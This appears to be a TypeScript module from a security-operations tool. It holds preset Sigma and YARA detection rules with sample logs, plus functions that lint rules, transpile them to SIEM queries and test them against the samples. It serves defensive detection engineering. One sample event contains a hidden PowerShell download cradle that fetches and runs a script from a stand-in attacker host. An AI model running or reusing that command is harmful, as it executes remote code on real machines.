import type { Severity } from "@/lib/severity";

export type RuleFormat = "sigma" | "yara";

export interface LintIssue {
  severity: "error" | "warning" | "info";
  message: string;
  field?: string;
  ruleRef?: string;
}

export interface TranspiledQueries {
  splunk: string;
  sentinel: string;
  elastic: string;
  qradar: string;
}

export interface EventMatchDetail {
  eventIndex: number;
  eventSummary: string;
  matched: boolean;
  matchedTokens: string[];
  details: string;
}

export interface EvaluationResult {
  matched: boolean;
  matchCount: number;
  totalEvents: number;
  eventMatches: EventMatchDetail[];
  executionMs: number;
  lintIssues: LintIssue[];
  transpiled: TranspiledQueries;
}

export interface DetectionRulePreset {
  id: string;
  name: string;
  format: RuleFormat;
  category: string;
  severity: Severity;
  mitreTechnique: string;
  description: string;
  rule: string;
  sampleEvents: string;
}

export const DETECTION_PRESETS: DetectionRulePreset[] = [
  {
    id: "powershell-amsi-bypass",
    name: "PowerShell AMSI Bypass & Download Cradle",
    format: "sigma",
    category: "Execution",
    severity: "high",
    mitreTechnique: "T1059.001",
    description: "Detects PowerShell execution with suspicious AMSI bypass markers and remote download cradles.",
    rule: `title: Suspicious PowerShell AMSI Bypass and Download Cradle
id: f38a0c20-7777-4444-8888-912345678abc
status: experimental
description: Detects PowerShell command line invoking WebClient or Invoke-WebRequest with bypass execution policy
logsource:
  product: windows
  category: process_creation
detection:
  selection_flags:
    EventID: 4688
    CommandLine|contains:
      - '-ExecutionPolicy Bypass'
      - '-NoProfile'
      - '-w hidden'
  selection_cradle:
    CommandLine|contains:
      - 'System.Net.WebClient'
      - 'DownloadFile'
      - 'Invoke-WebRequest'
      - 'IEX'
  condition: selection_flags and selection_cradle
tags:
  - attack.execution
  - attack.t1059.001
level: high`,
    sampleEvents: `EventID: 4688
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
CommandLine: powershell.exe -NoProfile -ExecutionPolicy Bypass -w hidden (New-Object System.Net.WebClient).DownloadFile('https://evil.c2-payload.org/loader.ps1', 'C:\\Users\\Public\\loader.ps1'); IEX (Get-Content C:\\Users\\Public\\loader.ps1)
ParentProcess: C:\\Windows\\explorer.exe
User: BEYONDLABS\\svc-backup

---
EventID: 4688
Image: C:\\Windows\\System32\\cmd.exe
CommandLine: cmd.exe /c echo "Routine maintenance script completed"
ParentProcess: C:\\Windows\\System32\\services.exe
User: NT AUTHORITY\\SYSTEM

---
EventID: 4688
Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
CommandLine: powershell.exe -ExecutionPolicy Bypass -Command "Get-Process"
ParentProcess: C:\\Windows\\System32\\cmd.exe
User: BEYONDLABS\\alice`,
  },
  {
    id: "pass-the-hash",
    name: "Pass-the-Hash / Overpass-the-Hash Activity",
    format: "sigma",
    category: "Lateral Movement",
    severity: "critical",
    mitreTechnique: "T1550.002",
    description: "Detects anomalous logon type 9 (NewCredentials) combined with NTLM authenticationSSP indicative of Overpass-the-Hash.",
    rule: `title: Potential Overpass the Hash Logon Attempt
id: 8b671a92-2222-4444-8888-987654321def
status: test
description: Detects Logon Type 9 with seclogo authentication indicative of Mimikatz sekurlsa::pth
logsource:
  product: windows
  service: security
detection:
  selection_logon:
    EventID: 4624
    LogonType: 9
  selection_provider:
    LogonProcessName|contains:
      - 'seclogo'
      - 'Advapi'
    AuthenticationPackageName: 'Negotiate'
  condition: selection_logon and selection_provider
tags:
  - attack.lateral_movement
  - attack.t1550.002
level: critical`,
    sampleEvents: `EventID: 4624
LogonType: 9
LogonProcessName: seclogo
AuthenticationPackageName: Negotiate
TargetUserName: Administrator
WorkstationName: WS-FIN-091
ProcessId: 0x48c
IpAddress: 10.14.3.55

---
EventID: 4624
LogonType: 3
LogonProcessName: Kerberos
AuthenticationPackageName: Kerberos
TargetUserName: bob
WorkstationName: WS-HR-002
IpAddress: 10.14.3.120`,
  },
  {
    id: "process-hollowing",
    name: "Process Hollowing & Suspicious Parent Tree",
    format: "sigma",
    category: "Defense Evasion",
    severity: "high",
    mitreTechnique: "T1055.012",
    description: "Detects legitimate Windows system utilities spawned by anomalous parent processes or user shells.",
    rule: `title: Suspicious svchost.exe Spawned by Non-Services Parent
id: 4e5d6c7b-3333-4444-8888-112233445566
status: stable
description: Detects svchost.exe spawned by explorer.exe or cmd.exe instead of services.exe
logsource:
  product: windows
  category: process_creation
detection:
  selection_target:
    EventID: 4688
    Image|endswith: '\\svchost.exe'
  selection_parent:
    ParentProcess|contains:
      - 'explorer.exe'
      - 'cmd.exe'
      - 'powershell.exe'
  condition: selection_target and selection_parent
tags:
  - attack.defense_evasion
  - attack.t1055.012
level: high`,
    sampleEvents: `EventID: 4688
Image: C:\\Windows\\System32\\svchost.exe
CommandLine: svchost.exe -k netsvcs -p -s BITS
ParentProcess: C:\\Windows\\explorer.exe
User: BEYONDLABS\\john.doe

---
EventID: 4688
Image: C:\\Windows\\System32\\svchost.exe
CommandLine: svchost.exe -k LocalServiceNetworkRestricted
ParentProcess: C:\\Windows\\System32\\services.exe
User: NT AUTHORITY\\LOCAL SERVICE`,
  },
  {
    id: "yara-cobalt-strike",
    name: "Cobalt Strike / Sliver Memory Beacon Artifacts",
    format: "yara",
    category: "Malware & C2",
    severity: "critical",
    mitreTechnique: "T1071.001",
    description: "YARA rule identifying in-memory Cobalt Strike Beacon metadata headers and reflective DLL loader signatures.",
    rule: `rule CobaltStrike_Beacon_Memory {
  meta:
    description = "Detects Cobalt Strike in-memory beacon profile signatures"
    author = "BeyondLabs SecOps"
    reference = "T1071.001"
    severity = "critical"
  strings:
    $beacon_init = "ReflectiveLoader" ascii
    $c2_pipe = "\\\\.\\pipe\\msagent_" ascii nocase
    $watermark = { 2e 2f 2e 2f }
    $cfg_magic = { 69 68 67 66 }
    $http_header = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" ascii
  condition:
    ($beacon_init and $c2_pipe) or ($http_header and $cfg_magic) or 2 of ($beacon_init, $c2_pipe, $watermark, $http_header)
}`,
    sampleEvents: `MZ......................@..................................................This program cannot be run in DOS mode.
.text.........ReflectiveLoader function export found at offset 0x1040
Connecting to named pipe: \\\\.\\pipe\\msagent_45a0 for inter-thread beacon telemetry.
Payload staging complete.`,
  },
];

/** Lints a Sigma or YARA rule against community specifications (Sigma HQ). */
export function lintDetectionRule(ruleText: string, format: RuleFormat): LintIssue[] {
  const issues: LintIssue[] = [];
  const lines = ruleText.split("\n");

  if (!ruleText.trim()) {
    return [{ severity: "error", message: "Rule body is empty." }];
  }

  if (format === "sigma") {
    // 1. Title
    const titleMatch = ruleText.match(/^title:\s*(.+)$/m);
    if (!titleMatch || !titleMatch[1].trim()) {
      issues.push({ severity: "error", message: "Missing required 'title' field in Sigma YAML header.", field: "title" });
    } else if (titleMatch[1].trim().length < 5) {
      issues.push({ severity: "warning", message: "Title is unusually short. Provide a descriptive title.", field: "title" });
    }

    // 2. ID (UUID)
    const idMatch = ruleText.match(/^id:\s*([0-9a-fA-F-]+)$/m);
    if (!idMatch) {
      issues.push({ severity: "warning", message: "Missing or non-UUID 'id' field (RFC 4122 UUID recommended).", field: "id" });
    }

    // 3. Logsource
    if (!ruleText.includes("logsource:")) {
      issues.push({ severity: "error", message: "Missing required 'logsource' definition block.", field: "logsource" });
    } else {
      if (!/category:|product:|service:/m.test(ruleText)) {
        issues.push({ severity: "warning", message: "Logsource should specify at least one of 'category', 'product', or 'service'.", field: "logsource" });
      }
    }

    // 4. Detection & Condition
    if (!ruleText.includes("detection:")) {
      issues.push({ severity: "error", message: "Missing required 'detection' block.", field: "detection" });
    } else {
      if (!/condition:\s*.+/m.test(ruleText)) {
        issues.push({ severity: "error", message: "Missing required 'condition' inside detection block.", field: "condition" });
      }
    }

    // 5. Level
    const levelMatch = ruleText.match(/^level:\s*(informational|low|medium|high|critical)$/m);
    if (!levelMatch) {
      issues.push({ severity: "warning", message: "Missing or non-standard 'level' (expected: informational, low, medium, high, critical).", field: "level" });
    }

    // 6. Tags
    if (!ruleText.includes("tags:")) {
      issues.push({ severity: "info", message: "Rule lacks 'tags' mapping (e.g. attack.t1059.001 for MITRE ATT&CK coverage).", field: "tags" });
    }
  } else {
    // YARA linting
    if (!/^rule\s+[\w_]+/m.test(ruleText)) {
      issues.push({ severity: "error", message: "Missing rule identifier declaration (e.g. 'rule MyRuleName {')." });
    }
    if (!/strings:\s*/m.test(ruleText)) {
      issues.push({ severity: "warning", message: "Rule lacks a 'strings:' declaration block." });
    }
    if (!/condition:\s*.+/m.test(ruleText)) {
      issues.push({ severity: "error", message: "Missing required 'condition:' statement in YARA rule." });
    }
    if (!/meta:\s*/m.test(ruleText)) {
      issues.push({ severity: "info", message: "Rule lacks 'meta:' documentation block." });
    }
  }

  return issues;
}

/** Compiles a parsed Sigma detection rule into Splunk SPL, Microsoft Sentinel KQL, Elastic EQL, and QRadar AQL. */
export function compileSigmaToQueries(ruleYaml: string): TranspiledQueries {
  const selections = extractSigmaSelections(ruleYaml);
  const conditionMatch = ruleYaml.match(/condition:\s*(.+)$/m);
  const condition = conditionMatch ? conditionMatch[1].trim() : "selection";

  // Build Splunk SPL
  const splunkParts: string[] = [];
  const sentinelParts: string[] = [];
  const elasticParts: string[] = [];
  const qradarParts: string[] = [];

  for (const [selName, fields] of Object.entries(selections)) {
    const selSplunk: string[] = [];
    const selSentinel: string[] = [];
    const selElastic: string[] = [];
    const selQradar: string[] = [];

    for (const [key, vals] of Object.entries(fields)) {
      const isContains = key.includes("|contains");
      const isEndsWith = key.includes("|endswith");
      const cleanField = key.split("|")[0];

      const valList = Array.isArray(vals) ? vals : [vals];

      if (valList.length === 1) {
        const val = valList[0];
        if (isContains) {
          selSplunk.push(`${cleanField}="*${val}*"`);
          selSentinel.push(`${cleanField} has "${val}"`);
          selElastic.push(`${mapElasticField(cleanField)} : "*${val}*"`);
          selQradar.push(`"${cleanField}" ILIKE '%${val}%'`);
        } else if (isEndsWith) {
          selSplunk.push(`${cleanField}="*${val}"`);
          selSentinel.push(`${cleanField} endswith "${val}"`);
          selElastic.push(`${mapElasticField(cleanField)} : "*${val}"`);
          selQradar.push(`"${cleanField}" ILIKE '%${val}'`);
        } else {
          selSplunk.push(`${cleanField}="${val}"`);
          selSentinel.push(`${cleanField} == "${val}"`);
          selElastic.push(`${mapElasticField(cleanField)} == "${val}"`);
          selQradar.push(`"${cleanField}" = '${val}'`);
        }
      } else if (valList.length > 1) {
        const orSplunk = valList.map((v) => `${cleanField}="*${v}*"`).join(" OR ");
        selSplunk.push(`(${orSplunk})`);

        const orSentinel = valList.map((v) => `${cleanField} has "${v}"`).join(" or ");
        selSentinel.push(`(${orSentinel})`);

        const orElastic = valList.map((v) => `${mapElasticField(cleanField)} : "*${v}*"`).join(" or ");
        selElastic.push(`(${orElastic})`);

        const orQradar = valList.map((v) => `"${cleanField}" ILIKE '%${v}%'`).join(" OR ");
        selQradar.push(`(${orQradar})`);
      }
    }

    if (selSplunk.length > 0) splunkParts.push(selSplunk.join(" AND "));
    if (selSentinel.length > 0) sentinelParts.push(selSentinel.join(" and "));
    if (selElastic.length > 0) elasticParts.push(selElastic.join(" and "));
    if (selQradar.length > 0) qradarParts.push(selQradar.join(" AND "));
  }

  const splunkJoiner = condition.includes(" or ") ? " OR " : " AND ";
  const sentinelJoiner = condition.includes(" or ") ? " or " : " and ";
  const elasticJoiner = condition.includes(" or ") ? " or " : " and ";
  const qradarJoiner = condition.includes(" or ") ? " OR " : " AND ";

  const splunk = `index=* ${splunkParts.length > 0 ? `(${splunkParts.join(splunkJoiner)})` : "EventCode=*"}`;
  const sentinel = `SecurityEvent | where ${sentinelParts.length > 0 ? sentinelParts.join(sentinelJoiner) : "EventID != 0"}`;
  const elastic = `process where ${elasticParts.length > 0 ? elasticParts.join(elasticJoiner) : "process.name != null"}`;
  const qradar = `SELECT * FROM events WHERE ${qradarParts.length > 0 ? qradarParts.join(qradarJoiner) : '"EventID" IS NOT NULL'}`;

  return { splunk, sentinel, elastic, qradar };
}

function mapElasticField(field: string): string {
  const f = field.toLowerCase();
  if (f === "image") return "process.executable";
  if (f === "commandline") return "process.command_line";
  if (f === "parentprocess") return "process.parent.executable";
  if (f === "eventid") return "event.code";
  if (f === "destinationip") return "destination.ip";
  if (f === "destinationport") return "destination.port";
  return field;
}

interface SelectionsMap {
  [selectionName: string]: {
    [fieldWithModifier: string]: string | string[];
  };
}

/** Parses the detection section of a Sigma YAML rule into selections map. */
function extractSigmaSelections(yaml: string): SelectionsMap {
  const selections: SelectionsMap = {};
  const lines = yaml.split("\n");

  let inDetection = false;
  let currentSelection: string | null = null;
  let currentField: string | null = null;

  for (let i = 0; i < lines.length; i++) {
    const rawLine = lines[i];
    const trimmed = rawLine.trim();

    if (trimmed.startsWith("detection:")) {
      inDetection = true;
      continue;
    }

    if (!inDetection) continue;

    // Check if we exited detection (e.g. tags:, level:, etc.)
    if (/^[a-zA-Z0-9_-]+:/.test(rawLine) && !rawLine.startsWith(" ") && !rawLine.startsWith("\t")) {
      break;
    }

    // Check for selection header e.g. "  selection:" or "  selection_cradle:"
    const selMatch = rawLine.match(/^\s{2}([a-zA-Z0-9_-]+):\s*$/);
    if (selMatch) {
      if (selMatch[1] === "condition") {
        currentSelection = null;
        continue;
      }
      currentSelection = selMatch[1];
      selections[currentSelection] = {};
      currentField = null;
      continue;
    }

    if (!currentSelection) continue;

    // Check for field e.g. "    CommandLine|contains:" or "    EventID: 4688"
    const fieldMatch = rawLine.match(/^\s{4}([a-zA-Z0-9_|]+):\s*(.*)$/);
    if (fieldMatch) {
      const fieldKey = fieldMatch[1];
      const directVal = fieldMatch[2].trim().replace(/^['"]|['"]$/g, "");

      if (directVal) {
        selections[currentSelection][fieldKey] = directVal;
        currentField = null;
      } else {
        // Multi-line list follows
        currentField = fieldKey;
        selections[currentSelection][currentField] = [];
      }
      continue;
    }

    // Check for list item e.g. "      - 'item'"
    if (currentField && rawLine.match(/^\s{6}-\s*(.+)$/)) {
      const listVal = rawLine.match(/^\s{6}-\s*(.+)$/)![1].trim().replace(/^['"]|['"]$/g, "");
      const existing = selections[currentSelection][currentField];
      if (Array.isArray(existing)) {
        existing.push(listVal);
      }
    }
  }

  return selections;
}

/** Parses and evaluates a Sigma rule against sample raw logs. */
export function parseAndEvaluateSigma(ruleYaml: string, sampleLogs: string): EvaluationResult {
  const start = performance.now();
  const lintIssues = lintDetectionRule(ruleYaml, "sigma");
  const transpiled = compileSigmaToQueries(ruleYaml);

  const rawEvents = sampleLogs.split(/\n\s*---\s*\n|\n\s*===\s*\n/);
  const events = rawEvents.map((e) => e.trim()).filter(Boolean);

  const selections = extractSigmaSelections(ruleYaml);
  const conditionMatch = ruleYaml.match(/condition:\s*(.+)$/m);
  const conditionExpr = conditionMatch ? conditionMatch[1].trim() : "selection";

  const eventMatches: EventMatchDetail[] = [];
  let totalMatches = 0;

  for (let idx = 0; idx < events.length; idx++) {
    const eventText = events[idx];
    const eventLines = eventText.split("\n").map((l) => l.trim());
    const eventSummary = eventLines[0] || `Event #${idx + 1}`;

    const matchedTokens: string[] = [];
    const selectionHits: Record<string, boolean> = {};

    for (const [selName, fields] of Object.entries(selections)) {
      let selMatched = true;

      for (const [fieldKey, expectedVal] of Object.entries(fields)) {
        const isContains = fieldKey.includes("|contains");
        const isEndsWith = fieldKey.includes("|endswith");
        const isStartsWith = fieldKey.includes("|startswith");
        const cleanField = fieldKey.split("|")[0];

        // Search for field value in event
        const fieldRegex = new RegExp(`^${cleanField}:?\\s*(.+)$`, "im");
        const match = eventText.match(fieldRegex);
        const actualValue = match ? match[1].trim() : eventText;

        const expectedList = Array.isArray(expectedVal) ? expectedVal : [expectedVal];
        let fieldHit = false;

        for (const exp of expectedList) {
          if (isContains) {
            if (actualValue.toLowerCase().includes(exp.toLowerCase())) {
              fieldHit = true;
              matchedTokens.push(exp);
            }
          } else if (isEndsWith) {
            if (actualValue.toLowerCase().endsWith(exp.toLowerCase())) {
              fieldHit = true;
              matchedTokens.push(exp);
            }
          } else if (isStartsWith) {
            if (actualValue.toLowerCase().startsWith(exp.toLowerCase())) {
              fieldHit = true;
              matchedTokens.push(exp);
            }
          } else {
            if (actualValue.toLowerCase() === exp.toLowerCase() || eventText.toLowerCase().includes(exp.toLowerCase())) {
              fieldHit = true;
              matchedTokens.push(exp);
            }
          }
        }

        if (!fieldHit) {
          selMatched = false;
        }
      }

      selectionHits[selName] = selMatched;
    }

    // Evaluate condition logic e.g. "selection_flags and selection_cradle"
    let overallMatch = false;
    if (conditionExpr.includes(" and not ")) {
      const [pos, neg] = conditionExpr.split(" and not ");
      overallMatch = Boolean(selectionHits[pos.trim()] && !selectionHits[neg.trim()]);
    } else if (conditionExpr.includes(" and ")) {
      const parts = conditionExpr.split(" and ");
      overallMatch = parts.every((p) => Boolean(selectionHits[p.trim()]));
    } else if (conditionExpr.includes(" or ")) {
      const parts = conditionExpr.split(" or ");
      overallMatch = parts.some((p) => Boolean(selectionHits[p.trim()]));
    } else {
      // Default: check if any selection hit or specific condition hit
      overallMatch = selectionHits[conditionExpr] !== undefined
        ? selectionHits[conditionExpr]
        : Object.values(selectionHits).some(Boolean);
    }

    if (overallMatch) {
      totalMatches++;
    }

    eventMatches.push({
      eventIndex: idx,
      eventSummary,
      matched: overallMatch,
      matchedTokens: Array.from(new Set(matchedTokens)),
      details: overallMatch
        ? `Condition [${conditionExpr}] satisfied with ${matchedTokens.length} token matches.`
        : `Condition [${conditionExpr}] failed or required fields not present.`,
    });
  }

  const executionMs = Math.round((performance.now() - start) * 100) / 100;

  return {
    matched: totalMatches > 0,
    matchCount: totalMatches,
    totalEvents: events.length,
    eventMatches,
    executionMs,
    lintIssues,
    transpiled,
  };
}

/** Parses and evaluates a YARA rule against sample payload string or hex. */
export function parseAndEvaluateYara(ruleText: string, samplePayload: string): EvaluationResult {
  const start = performance.now();
  const lintIssues = lintDetectionRule(ruleText, "yara");

  // Extract strings definitions: $a = "value" ascii nocase
  const stringTokens: { id: string; val: string; isHex: boolean; nocase: boolean }[] = [];
  const strMatches = ruleText.matchAll(/^\s*(\$[a-zA-Z0-9_]+)\s*=\s*(.+)$/gm);

  for (const m of strMatches) {
    const id = m[1];
    const def = m[2].trim();
    const nocase = def.includes("nocase");

    const textMatch = def.match(/"([^"]+)"/);
    if (textMatch) {
      stringTokens.push({ id, val: textMatch[1], isHex: false, nocase });
      continue;
    }

    const hexMatch = def.match(/\{\s*([0-9a-fA-F\s?]+)\s*\}/);
    if (hexMatch) {
      stringTokens.push({ id, val: hexMatch[1].replace(/\s+/g, ""), isHex: true, nocase: false });
    }
  }

  const conditionMatch = ruleText.match(/condition:\s*(.+)$/m);
  const condition = conditionMatch ? conditionMatch[1].trim() : "any of them";

  const matchedTokens: string[] = [];
  const tokenHits: Record<string, boolean> = {};

  for (const token of stringTokens) {
    let hit = false;
    if (token.isHex) {
      // Hex pattern search
      hit = samplePayload.includes(token.val);
    } else {
      if (token.nocase) {
        hit = samplePayload.toLowerCase().includes(token.val.toLowerCase());
      } else {
        hit = samplePayload.includes(token.val);
      }
    }

    tokenHits[token.id] = hit;
    if (hit) {
      matchedTokens.push(token.val);
    }
  }

  // Condition evaluation
  let ruleMatched = false;
  if (condition.includes("all of them")) {
    ruleMatched = stringTokens.length > 0 && Object.values(tokenHits).every(Boolean);
  } else if (condition.includes("any of them")) {
    ruleMatched = Object.values(tokenHits).some(Boolean);
  } else {
    // Check specific identifier or count
    ruleMatched = Object.values(tokenHits).filter(Boolean).length > 0;
  }

  const executionMs = Math.round((performance.now() - start) * 100) / 100;

  return {
    matched: ruleMatched,
    matchCount: ruleMatched ? 1 : 0,
    totalEvents: 1,
    eventMatches: [
      {
        eventIndex: 0,
        eventSummary: "Sample In-Memory / File Payload",
        matched: ruleMatched,
        matchedTokens,
        details: ruleMatched
          ? `YARA condition satisfied with ${matchedTokens.length}/${stringTokens.length} string hits.`
          : `YARA condition failed. Found ${matchedTokens.length}/${stringTokens.length} matching string signatures.`,
      },
    ],
    executionMs,
    lintIssues,
    transpiled: {
      splunk: `# YARA rules cannot be directly transpiled to SPL — use yara_scan modular command`,
      sentinel: `// YARA signature: ${stringTokens.map((s) => s.val).join(", ")}`,
      elastic: `// YARA strings in memory: ${stringTokens.map((s) => s.val).join(", ")}`,
      qradar: `-- YARA condition: ${condition}`,
    },
  };
}
